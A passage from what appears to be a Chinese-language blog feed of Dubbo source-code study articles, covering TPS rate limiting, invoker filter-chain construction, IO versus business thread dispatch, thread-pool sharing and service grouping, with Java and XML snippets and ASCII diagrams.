case</h3><h4 id="在source-folder下放置，META-INF-dubbo-com-alibaba-dubbo-rpc-Filter"><a href="#在source-folder下放置，META-INF-dubbo-com-alibaba-dubbo-rpc-Filter" class="headerlink" title="在source folder下放置，META-INF/dubbo/com.alibaba.dubbo.rpc.Filter"></a>在source folder下放置，META-INF/dubbo/com.alibaba.dubbo.rpc.Filter</h4><p>里面写入 tpslimiter=com.alibaba.dubbo.rpc.filter.TpsLimitFilter<br>表示将TpsLimitFilter这个filter的扩展给装配给dubbo  </p><h4 id="provider侧的配置"><a href="#provider侧的配置" class="headerlink" title="provider侧的配置"></a>provider侧的配置</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.HelloService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.helloService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"tpslimiter"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"tps"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"5"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span></code></pre><p>意思对HelloService 这个接口在provider侧做tps为5的限流，默认间隔是60s，可以通过<code>tps.interval</code>这个parameter进行配置，单位是毫秒。注意此处配置的tps为5，<code>不是</code>每秒限制通过5个以内的请求，而是<code>单位时间间隔内</code>通过5个以内的请求。关于单位时间间隔前面解释了。  </p><p>##1.2 如果超限了是什么现象？<br>客户端会抛出rpc调用异常：<br>com.alibaba.dubbo.rpc.RpcException: Failed to invoke service org.simonme.dubbo.demo.provider.service.HelloService.sayHello because exceed max service tps  </p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>主要是<code>DefaultTPSLimiter</code>和<code>StatItem</code>两个类配合完成。采用的是<code>令牌桶</code>算法，实现在<code>StatItem</code>类中。<br>大意是：<br>每隔一个单位时间后重置令牌桶中令牌的数量，然后每次请求来的时候减1，减到小于0时，拒绝请求。  </p><pre><code class="hljs java"><span class="hljs-keyword">long</span> now = System.currentTimeMillis();<span class="hljs-keyword">if</span> (now &gt; lastResetTime + interval) &#123;    token.set(rate);    lastResetTime = now;&#125;<span class="hljs-keyword">int</span> value = token.get();<span class="hljs-keyword">boolean</span> flag = <span class="hljs-keyword">false</span>;<span class="hljs-keyword">while</span> (value &gt; <span class="hljs-number">0</span> &amp;&amp; !flag) &#123;    flag = token.compareAndSet(value, value - <span class="hljs-number">1</span>);    value = token.get();&#125;</code></pre><p>注意：此实现依赖系统时间，如果想用相对时间实现，可以参见<a href="https://github.com/apache/incubator-dubbo/issues/2345" target="_blank" rel="noopener">这里 dubbo的TPS限流模块在运行时系统时间发生变化的情况下限流不能正常工作 #2345</a>。  </p><h3 id="spring-cloud限流"><a href="#spring-cloud限流" class="headerlink" title="spring cloud限流"></a>spring cloud限流</h3><p>对于采用spring cloud的架构的项目，可以借助guava的<code>RateLimiter</code>来实现<code>ZuulFilter</code>的子类来达成tps限流的目的。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]24.调用链如何构建的？ProtocolFilterWrapper分析</title>
    <link href="/2020/06/13/dubbo-24.ProtocolFilterWrapper-study/"/>
    <url>/2020/06/13/dubbo-24.ProtocolFilterWrapper-study/</url>
    
    <content type="html"><![CDATA[<h2 id="24-调用链如何构建的？ProtocolFilterWrapper分析"><a href="#24-调用链如何构建的？ProtocolFilterWrapper分析" class="headerlink" title="24.调用链如何构建的？ProtocolFilterWrapper分析"></a>24.调用链如何构建的？ProtocolFilterWrapper分析</h2><p>调用链的构建，可以理解成多个invoker实例组成链的构建。</p><p>调用链构建在dubbo中分为两步骤：</p><ol><li>JavassistProxyFactory$1的构建。此步骤是将真正的业务方法同规避反射的手段包起来。</li><li>ProtocolFilterWrapper$1的构建。此步骤是将每个filter用Invoker实例包起来并串起来链来。</li></ol><p>具体代码和示意图参见下面</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="JavassistProxyFactory-1的构建代码"><a href="#JavassistProxyFactory-1的构建代码" class="headerlink" title="JavassistProxyFactory$1的构建代码"></a>JavassistProxyFactory$1的构建代码</h4><pre><code class="hljs java"><span class="hljs-comment">// JavassistProxyFactory</span><span class="hljs-comment">// public class JavassistProxyFactory extends AbstractProxyFactory</span><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">Invoker&lt;T&gt; <span class="hljs-title">getInvoker</span><span class="hljs-params">(T proxy, Class&lt;T&gt; type, URL url)</span> </span>&#123;        <span class="hljs-comment">// TODO Wrapper类不能正确处理带$的类名</span>        <span class="hljs-keyword">final</span> Wrapper wrapper = Wrapper.getWrapper(proxy.getClass().getName().indexOf(<span class="hljs-string">'$'</span>) &lt; <span class="hljs-number">0</span> ? proxy.getClass() : type);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> AbstractProxyInvoker&lt;T&gt;(proxy, type, url) &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">doInvoke</span><span class="hljs-params">(T proxy, String methodName, </span></span><span class="hljs-function"><span class="hljs-params">                                      Class&lt;?&gt;[] parameterTypes, </span></span><span class="hljs-function"><span class="hljs-params">                                      Object[] arguments)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;                <span class="hljs-keyword">return</span> wrapper.invokeMethod(proxy, methodName, parameterTypes, arguments);            &#125;        &#125;;    &#125;</code></pre><h4 id="ProtocolFilterWrapper-1的构建代码"><a href="#ProtocolFilterWrapper-1的构建代码" class="headerlink" title="ProtocolFilterWrapper$1的构建代码"></a>ProtocolFilterWrapper$1的构建代码</h4><pre><code class="hljs java"><span class="hljs-comment">// ProtocolFilterWrapper </span><span class="hljs-comment">// public class ProtocolFilterWrapper implements Protocol</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-function">Invoker&lt;T&gt; <span class="hljs-title">buildInvokerChain</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Invoker&lt;T&gt; invoker, String key, String group)</span> </span>&#123;        Invoker&lt;T&gt; last = invoker;        List&lt;Filter&gt; filters = ExtensionLoader.getExtensionLoader(Filter<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getActivateExtension</span>(<span class="hljs-title">invoker</span>.<span class="hljs-title">getUrl</span>(), <span class="hljs-title">key</span>, <span class="hljs-title">group</span>)</span>;        <span class="hljs-keyword">if</span> (filters.size() &gt; <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = filters.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i --) &#123;                <span class="hljs-keyword">final</span> Filter filter = filters.get(i);                <span class="hljs-keyword">final</span> Invoker&lt;T&gt; next = last;                last = <span class="hljs-keyword">new</span> Invoker&lt;T&gt;() &#123;                    <span class="hljs-function"><span class="hljs-keyword">public</span> Class&lt;T&gt; <span class="hljs-title">getInterface</span><span class="hljs-params">()</span> </span>&#123;                        <span class="hljs-keyword">return</span> invoker.getInterface();                    &#125;                    <span class="hljs-function"><span class="hljs-keyword">public</span> URL <span class="hljs-title">getUrl</span><span class="hljs-params">()</span> </span>&#123;                        <span class="hljs-keyword">return</span> invoker.getUrl();                    &#125;                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAvailable</span><span class="hljs-params">()</span> </span>&#123;                        <span class="hljs-keyword">return</span> invoker.isAvailable();                    &#125;                    <span class="hljs-function"><span class="hljs-keyword">public</span> Result <span class="hljs-title">invoke</span><span class="hljs-params">(Invocation invocation)</span> <span class="hljs-keyword">throws</span> RpcException </span>&#123;                        <span class="hljs-keyword">return</span> filter.invoke(next, invocation);                    &#125;                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;                        invoker.destroy();                    &#125;                    <span class="hljs-meta">@Override</span>                    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;                        <span class="hljs-keyword">return</span> invoker.toString();                    &#125;                &#125;;            &#125;        &#125;        <span class="hljs-keyword">return</span> last;    &#125;</code></pre><h3 id="构建图示"><a href="#构建图示" class="headerlink" title="构建图示"></a>构建图示</h3><h4 id="ProtocolFilterWrapper-1的构建图示"><a href="#ProtocolFilterWrapper-1的构建图示" class="headerlink" title="ProtocolFilterWrapper$1的构建图示"></a>ProtocolFilterWrapper$1的构建图示</h4><pre><code class="hljs plain">        filter * n   +-+-+                                                        +-+-+ ①   |  +----------+   +----------+   +----------+  +----------+  |     |  | filter0  &lt;----|filter1  &lt;---+ filter2  &lt;---|filtern  |  |     |  +----------+   +----------+   +----------+  +----------+  |   +-+-+                                                        +-+-+                                     &lt;-------------------------+  +----------------------------------------+                ②  |    ③   JavassistProxyFactory$1            |                   |                                           |                   |                      +             +      |                   |             +--------+  inVoker    |      |                   |             |        +--------------------v----+              |             |        |   filtern   |  next     |              |             |        +-------------+-----------+              |             |                                                 |             +-----------------------------+                   |                                           |                   |build                 +             +      |                   |Invoker      +--------+  inVoker    |      |                   |Chain        |        +--------------------v----+              |             |        |   filter2   |  next     |              |             |        +-------------+-----------+              |             |                                                 |             +-----------------------------+                   |                                           |                   |                      +             +      |                   |             +--------+  inVoker    |      |                   |             |        +--------------------v----+              |             |        |   filter1   |  next     |              |             |        +-------------+-----------+              |             |                                                 |             +-----------------------------+                   |                                           |                   |                      +             +      |                   |             +--------+  inVoker    |      |                   |             |        +--------------------v----+              |             |        |   filter0   |  next     |              v             |        +-------------+-----------+             |             |  &lt;----------+    ④  ProtocolFilterWrapper$1</code></pre><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><h4 id="JavassistProxyFactory-1的构建解释"><a href="#JavassistProxyFactory-1的构建解释" class="headerlink" title="JavassistProxyFactory$1的构建解释"></a>JavassistProxyFactory$1的构建解释</h4><p>此步骤是将真正的业务方法同规避反射的手段包起来。具体实现逻辑在：</p><pre><code class="hljs java"><span class="hljs-keyword">final</span> Wrapper wrapper = Wrapper.getWrapper(proxy.getClass().getName().indexOf(<span class="hljs-string">'$'</span>) &lt; <span class="hljs-number">0</span> ? proxy.getClass() : type);</code></pre><p>这个通过动态生成生成的Wrapper通过直接调用业务类方法规避了反射调用。具体细节和生成的代码可以参见《反射调用是如何优化的？Wrapper的作用是什么？》。</p><h4 id="ProtocolFilterWrapper-1的构建解释"><a href="#ProtocolFilterWrapper-1的构建解释" class="headerlink" title="ProtocolFilterWrapper$1的构建解释"></a>ProtocolFilterWrapper$1的构建解释</h4><p>从③处将JavassistProxyFactory$1送进来到④处将ProtocolFilterWrapper$1送出去之间，就是构建调用链的整个过程。</p><p>构建过程中<strong>倒序</strong>迭代过滤器，将每一个过滤器用invoker匿名内部类包起来，并结合外围变量next组成一个类似闭包的样子，通过<strong>每次切换外围next变量的指向形成链</strong>。迭代过程中，<strong>每次next都指向上一次构建</strong>invoker匿名内部类包起来的闭包。</p><p>为啥要倒序迭代？因为这样<strong>能达成调用时正序迭代</strong>，结合调用时调用栈能看的更清楚。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]23.IO线程与业务线程的合与分，以及提供的策略选择实现分析</title>
    <link href="/2020/06/13/dubbo-23.io-thread-biz-thread/"/>
    <url>/2020/06/13/dubbo-23.io-thread-biz-thread/</url>
    
    <content type="html"><![CDATA[<h2 id="23-IO线程与业务线程的合与分，以及提供的策略选择实现分析"><a href="#23-IO线程与业务线程的合与分，以及提供的策略选择实现分析" class="headerlink" title="23.IO线程与业务线程的合与分，以及提供的策略选择实现分析"></a>23.IO线程与业务线程的合与分，以及提供的策略选择实现分析</h2><p>io线程与业务线程合在一个线程上，还是把业务线程拆成单独的线程(线程池)去处理，一般来讲，取决于业务线程是否比较耗时。  </p><p>如果业务线程比较耗时，就可以拆成单独的线程池处理，这样可以提升io吞吐。  </p><p>如果业务线程不怎么耗时，处理非常快，那么就可以不拆成单独线程，因为这样可以降低上下文切换cs带来的开销。  </p><p>这种方式在多个中间件都会有涉及。   </p><p>dubbo中给予了多种选择，由使用方自行决定配置。默认是与io线程分开。  </p><p>下面我们将分析dubbo中业务线程池的处理及对ChannelHandler与Dispatcher的处理。 </p><p>我们先分析下HeaderExchangeXXX与上下层的交互。</p><h3 id="HeaderExchangeXXX与上下层的交互示意图"><a href="#HeaderExchangeXXX与上下层的交互示意图" class="headerlink" title="HeaderExchangeXXX与上下层的交互示意图"></a>HeaderExchangeXXX与上下层的交互示意图</h3><pre><code class="hljs plain">                                           ①    +-------------------------+                                                |    DubboProtocol        |                                                +------------^------------+                                                             |                                                             |                                                             |          +-------------------------------+                  |          |DecodeHandler                  |                  |+---------&gt;   +-------------------------+ |                  |          |   |HeaderExchangeHandler    | |                  |   ②      |   |  +--------------------+ | |                  |          |   |  |  DubboProtocol$1   | | |                  | +--------+   |  |   requestHandler   | | |                  | |        |   |  +----------------------+ |      +-----------+------------+ |        |   +---------------------------+      |  HeaderExchangeSerVer  +&lt;--+ |        +-------------------------------+      +------------------------+   | |                                                                            | |                                                                            | |                                                                            | |                                                                            | |                                                                            | |                                                                            | |         ChannelHandlers.wrapInternal                                       | |        +----------------------------------+                                | |        |MultiMessageHandler               +---------------------------+    | |        |   +----------------------------+ |                           |    | |    ③   |   |HeartbeatHandler            | |    +----------------------v----+-+ |        |   |  +-----------------------+ | |    |  new NettySerVer(xxHandler) | |        |   |  |  Dispatcher.dispatch  | | |    +-----------------------------+ |        |   |  |   AllChannelHandler   | | | |        |   |  +---------------------^-----+ |        |   +------------------------------| |        +----------------------------------+ |                                     | +-------------------------------------+</code></pre><p>①是Protocol层。代码参见com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.createServer(URL) 287行。</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> ExchangeServer <span class="hljs-title">createServer</span><span class="hljs-params">(URL url)</span> </span>&#123;    <span class="hljs-comment">//默认开启server关闭时发送readonly事件</span>    url = url.addParameterIfAbsent(Constants.CHANNEL_READONLYEVENT_SENT_KEY, Boolean.TRUE.toString());    <span class="hljs-comment">//默认开启heartbeat</span>    url = url.addParameterIfAbsent(Constants.HEARTBEAT_KEY, String.valueOf(Constants.DEFAULT_HEARTBEAT));    String str = url.getParameter(Constants.SERVER_KEY, Constants.DEFAULT_REMOTING_SERVER);    <span class="hljs-keyword">if</span> (str != <span class="hljs-keyword">null</span> &amp;&amp; str.length() &gt; <span class="hljs-number">0</span> &amp;&amp; ! ExtensionLoader.getExtensionLoader(Transporter<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">hasExtension</span>(<span class="hljs-title">str</span>))</span>        throw new RpcException("Unsupported server type: " + str + ", url: " + url);    url = url.addParameter(Constants.CODEC_KEY, Version.isCompatibleVersion() ? COMPATIBLE_CODEC_NAME : DubboCodec.NAME);    ExchangeServer server;    <span class="hljs-keyword">try</span> &#123;        server = Exchangers.bind(url, requestHandler); <span class="hljs-comment">// 287行</span>    &#125; <span class="hljs-keyword">catch</span> (RemotingException e) &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RpcException(<span class="hljs-string">"Fail to start server(url: "</span> + url + <span class="hljs-string">") "</span> + e.getMessage(), e);    &#125;    str = url.getParameter(Constants.CLIENT_KEY);    <span class="hljs-keyword">if</span> (str != <span class="hljs-keyword">null</span> &amp;&amp; str.length() &gt; <span class="hljs-number">0</span>) &#123;        Set&lt;String&gt; supportedTypes = ExtensionLoader.getExtensionLoader(Transporter<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getSupportedExtensions</span>()</span>;        <span class="hljs-keyword">if</span> (!supportedTypes.contains(str)) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RpcException(<span class="hljs-string">"Unsupported client type: "</span> + str);        &#125;    &#125;    <span class="hljs-keyword">return</span> server;&#125;</code></pre><p>②是Exchange层。代码参见com.alibaba.dubbo.remoting.exchange.support.header.HeaderExchanger.bind(URL, ExchangeHandler)</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ExchangeServer <span class="hljs-title">bind</span><span class="hljs-params">(URL url, ExchangeHandler handler)</span> <span class="hljs-keyword">throws</span> RemotingException </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> HeaderExchangeServer(Transporters.bind(url, <span class="hljs-keyword">new</span> DecodeHandler(<span class="hljs-keyword">new</span> HeaderExchangeHandler(handler))));&#125;</code></pre><p>③是Transport层。代码参见com.alibaba.dubbo.remoting.transport.netty.NettyServer.NettyServer(URL, ChannelHandler)</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">NettyServer</span><span class="hljs-params">(URL url, ChannelHandler handler)</span> <span class="hljs-keyword">throws</span> RemotingException</span>&#123;    <span class="hljs-keyword">super</span>(url, ChannelHandlers.wrap(handler, ExecutorUtil.setThreadName(url, SERVER_THREAD_POOL_NAME)));&#125;</code></pre><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> ChannelHandler <span class="hljs-title">wrapInternal</span><span class="hljs-params">(ChannelHandler handler, URL url)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MultiMessageHandler(<span class="hljs-keyword">new</span> HeartbeatHandler(ExtensionLoader.getExtensionLoader(Dispatcher<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span><span class="hljs-class">                                    .<span class="hljs-title">getAdaptiveExtension</span>().<span class="hljs-title">dispatch</span>(<span class="hljs-title">handler</span>, <span class="hljs-title">url</span>)))</span>;&#125;</code></pre><h3 id="整体概述"><a href="#整体概述" class="headerlink" title="整体概述"></a>整体概述</h3><p>使用的地方在ChannelHandlers中(注意不是ChannelHandler)：</p><pre><code class="hljs java"><span class="hljs-comment">// ChannelHandlers</span><span class="hljs-function"><span class="hljs-keyword">protected</span> ChannelHandler <span class="hljs-title">wrapInternal</span><span class="hljs-params">(ChannelHandler handler, URL url)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MultiMessageHandler(<span class="hljs-keyword">new</span> HeartbeatHandler(ExtensionLoader.getExtensionLoader(Dispatcher<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span><span class="hljs-class">                                    .<span class="hljs-title">getAdaptiveExtension</span>().<span class="hljs-title">dispatch</span>(<span class="hljs-title">handler</span>, <span class="hljs-title">url</span>)))</span>;&#125;</code></pre><p>handler的多层叠加形式，依赖委托的玩法，即每次创建实例的时候将被委托的handler通过构造参数送进去传递给super的handler字段。</p><p>MultiMessageHandler  –&gt; HeartbeatHandler  –&gt; 通过扩展点拿到的Dispatcher的具体扩展，在根据这个Dispatcher实例dispatch出具体的handler实例。</p><p>每次handle时，按上面顺序进行。  </p><p>MultiMessageHandler 负责如果是多消息时，挨个调用上层委托去handler</p><p>HeartbeatHandler   负责如果是心跳消息由他自己处理，否则调用上层委托去处理。并设置读写时间戳。读写时间戳对应Channel上的一对attr。</p><h3 id="Dispatcher"><a href="#Dispatcher" class="headerlink" title="Dispatcher"></a>Dispatcher</h3><p>Dispatcher的具体扩展有：</p><ol><li>AllDispatcher   [默认实现]   对应AllChannelHandler实例，与io线程隔离。</li><li>ConnectionOrderedDispatcher  对应ConnectionOrderedChannelHandler实例</li><li>DirectDispatcher  <strong>将原handler直接返回，即不创建线程池</strong></li><li>ExecutionDispatcher  对应ExecutionChannelHandler实例</li><li>MessageOnlyDispatcher   对应MessageOnlyChannelHandler</li></ol><h3 id="ChannelHandler"><a href="#ChannelHandler" class="headerlink" title="ChannelHandler"></a>ChannelHandler</h3><h4 id="AllChannelHandler"><a href="#AllChannelHandler" class="headerlink" title="AllChannelHandler"></a>AllChannelHandler</h4><p>整体逻辑比较简单：当有连接、断开、接收等事件时构造对应的ChannelEventRunnable实例丢进线程池执行。至于<strong>线程池的选用有点文章</strong>。这个地方也是<strong>netty的io线程跟dubbo server handler线程切换的地方</strong>。也是<strong>ChannelEventRunnable实例创建</strong>的地方(在我们业务方法调用栈上可以看到)。</p><p>对于dubbo server handler的线程池是否隔离的策略分析可以参见上文 业务侧共享线程池还是隔离线程池区别与实现分析。 </p><h4 id="ConnectionOrderedChannelHandler"><a href="#ConnectionOrderedChannelHandler" class="headerlink" title="ConnectionOrderedChannelHandler"></a>ConnectionOrderedChannelHandler</h4><p>连接和断开交给改handler定制的connectionExecutor来完成，其余的接收等事件与AllChannelhandler逻辑相同使用全局共享的或者实例级别的线程池。</p><p>connectionExecutor是用的LinkedBlockingQueue队列做的线程池，连接容量通过<code>connect.queue.capacity</code>配置项指定，队列满后打日志并抛异常。  </p><h4 id="ExecutionChannelHandler"><a href="#ExecutionChannelHandler" class="headerlink" title="ExecutionChannelHandler"></a>ExecutionChannelHandler</h4><p>这个handler是不走全局共享的线程，所有连接、断开、接收等事件全部使用实例级别的线程池。</p><h4 id="MessageOnlyChannelHandler"><a href="#MessageOnlyChannelHandler" class="headerlink" title="MessageOnlyChannelHandler"></a>MessageOnlyChannelHandler</h4><p>只有接收事件走线程池，其他事件全部使用io线程。接收事件走线程池的策略与AllChannelHandler相同。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]22.业务侧共享线程池还是隔离线程池区别与实现分析</title>
    <link href="/2020/06/13/dubbo-22.shared-thread-pool/"/>
    <url>/2020/06/13/dubbo-22.shared-thread-pool/</url>
    
    <content type="html"><![CDATA[<h2 id="22-业务侧共享线程池还是隔离线程池区别与实现分析"><a href="#22-业务侧共享线程池还是隔离线程池区别与实现分析" class="headerlink" title="22.业务侧共享线程池还是隔离线程池区别与实现分析"></a>22.业务侧共享线程池还是隔离线程池区别与实现分析</h2><p>接下来两篇文章要讨论下线程隔离的问题，有两个维度：</p><ol><li>一个节点上多个provider之间的隔离。即下图的4 5 6线程是否要隔离在不同的线程池。</li><li>一个节点上io线程与server handler线程的隔离。即下图的1与4(或者2和5，3和6)是否在同一个线程上执行。</li></ol><pre><code class="hljs plain">              I&#x2F;O                      server hadnler         +--------------+            +---------------+         |              |            |               |+--------&gt;   +-------+  +-----------&gt;+  +--------+   |         |    thread 1  |            |   thread 4    |+--------&gt;   +-------+  +------------&gt;  +--------+   |         |    thread 2  |            |   thread 5    |+--------&gt;   +-------+  +-----------&gt;+  +--------+   |         |    thread 3  |            |   thread 6    |         +--------------+            +---------------+           provider   node  1</code></pre><p>如果我们一个应用提供多个provider服务，那么我们就面临一个问题，当这些provider接到请求后进行处理时，是将这些请求都放到一个线程池中处理，还是可以隔离开？  </p><p>dubbo支持隔离开的配置。  </p><h3 id="dubbo-server-handler线程池的共享与隔离的分析"><a href="#dubbo-server-handler线程池的共享与隔离的分析" class="headerlink" title="dubbo server handler线程池的共享与隔离的分析"></a>dubbo server handler线程池的共享与隔离的分析</h3><p>线程池 分两种，一种是全局共享的，一种是Handler实例级别的。默认全局的。没有配置Handler实例级别就是共享的。</p><p>全局共享的是：</p><pre><code class="hljs java"><span class="hljs-comment">// WrappedChannelHandler</span><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ExecutorService SHARED_EXECUTOR = Executors.newCachedThreadPool(<span class="hljs-keyword">new</span> NamedThreadFactory(<span class="hljs-string">"DubboSharedHandler"</span>, <span class="hljs-keyword">true</span>));<span class="hljs-comment">// com.alibaba.dubbo.remoting.transport.dispatcher.WrappedChannelHandler.WrappedChannelHandler(ChannelHandler, URL)</span><span class="hljs-comment">// AllChannelHandler的父类是WrappedChannelHandler</span>executor = (ExecutorService) ExtensionLoader.getExtensionLoader(ThreadPool<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getAdaptiveExtension</span>().<span class="hljs-title">getExecutor</span>(<span class="hljs-title">url</span>)</span>;</code></pre><p>到底是用全局共享的还是用实例级别的参见这里代码：</p><pre><code class="hljs java"><span class="hljs-comment">// com.alibaba.dubbo.remoting.transport.dispatcher.all.AllChannelHandler.getExecutorService()</span><span class="hljs-function"><span class="hljs-keyword">private</span> ExecutorService <span class="hljs-title">getExecutorService</span><span class="hljs-params">()</span> </span>&#123;    ExecutorService cexecutor = executor;    <span class="hljs-keyword">if</span> (cexecutor == <span class="hljs-keyword">null</span> || cexecutor.isShutdown()) &#123;         cexecutor = SHARED_EXECUTOR;    &#125;    <span class="hljs-keyword">return</span> cexecutor;&#125;</code></pre><p>非共享的取决于配置了何种线程池。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]21.服务分组实现</title>
    <link href="/2020/06/13/dubbo-21.how-to-implement-group/"/>
    <url>/2020/06/13/dubbo-21.how-to-implement-group/</url>
    
    <content type="html"><![CDATA[<h2 id="21-服务分组实现"><a href="#21-服务分组实现" class="headerlink" title="21.服务分组实现"></a>21.服务分组实现</h2><h3 id="分析服务分组的test-case"><a href="#分析服务分组的test-case" class="headerlink" title="分析服务分组的test case"></a>分析服务分组的test case</h3><p>我们假设的场景是，多idc机房，一个zk注册中心，我们通过分组设置达到，本机房的consumer调用本机房的provider。为了分析，我们假设了两个idc机房idc001和idc002</p><p>provider端的节点1服务配置上加上group：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.facade.service.HelloService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.helloService"</span></span><span class="hljs-tag">        <span class="hljs-attr">group</span>=<span class="hljs-string">"idc001"</span>/&gt;</span></code></pre><p>节点2的group设置为idc002。  </p><p>consumer端节点1的ref配置上加上group：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"helloService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.facade.service.HelloService"</span> <span class="hljs-attr">group</span>=<span class="hljs-string">"idc001"</span>/&gt;</span></code></pre><p>与provider一样，节点2的group设置为idc002。</p><p>我们把case跑起来就能发现group为idc001的消费者调用group为idc001的provider，002的调用002的。  </p><h3 id="分析分组调用"><a href="#分析分组调用" class="headerlink" title="分析分组调用"></a>分析分组调用</h3><p>从上面的case我们可以看出，我们要解决的问题，分组的消费组如何调用到对应分组的provider。  </p><p>我直接贴下调用栈，这是启动consumer时构造proxy的场景，对于那种后起来的加进来的provider与之类似。  </p><pre><code class="hljs java">UrlUtils.isMatch(URL, URL) line: <span class="hljs-number">375</span>ZookeeperRegistry.toUrlsWithoutEmpty(URL, List&lt;String&gt;) line: <span class="hljs-number">258</span>ZookeeperRegistry.toUrlsWithEmpty(URL, String, List&lt;String&gt;) line: <span class="hljs-number">268</span>ZookeeperRegistry.doSubscribe(URL, NotifyListener) line: <span class="hljs-number">167</span>ZookeeperRegistry(FailbackRegistry).subscribe(URL, NotifyListener) line: <span class="hljs-number">189</span>RegistryDirectory&lt;T&gt;.subscribe(URL) line: <span class="hljs-number">133</span>RegistryProtocol.doRefer(Cluster, Registry, Class&lt;T&gt;, URL) line: <span class="hljs-number">271</span>RegistryProtocol.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">254</span>ProtocolFilterWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">60</span>ProtocolListenerWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">63</span>Protocol$Adpative.refer(Class, URL) line: not availableReferenceBean&lt;T&gt;(ReferenceConfig&lt;T&gt;).createProxy(Map&lt;String,String&gt;) line: <span class="hljs-number">392</span></code></pre><p>我们在前面 09.消费者如何发现服务 一文中写过，在发现服务时，是靠添加监听器时并拿到children时，获得了provider列表。此处，是接着发现服务后的逻辑继续处理，在ZookeeperRegistry.doSubscribe发现了provider列表后，会通过UrlUtils.isMatch来匹配这个provider是要留下，匹配的字段里就有group，即比较consumer的group和provider是否一致，不一致的就丢弃了。version的机制也是在这里处理。  </p><p>贴一下 比对的代码：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(URL consumerUrl, URL providerUrl)</span> </span>&#123;    String consumerInterface = consumerUrl.getServiceInterface();    String providerInterface = providerUrl.getServiceInterface();    <span class="hljs-keyword">if</span>( ! (Constants.ANY_VALUE.equals(consumerInterface) || StringUtils.isEquals(consumerInterface, providerInterface)) ) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">if</span> (! 